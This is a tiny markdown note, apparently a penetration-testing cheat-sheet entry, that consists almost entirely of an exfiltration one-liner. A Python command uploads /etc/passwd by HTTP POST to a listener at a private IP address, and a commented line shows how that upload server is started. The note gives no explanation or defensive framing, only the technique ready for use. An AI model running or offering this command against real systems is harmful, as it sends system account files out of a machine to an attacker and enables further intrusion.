---
public: true # set to true to make the article publishable
---

```
# python3 -m uploadserver 
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'



```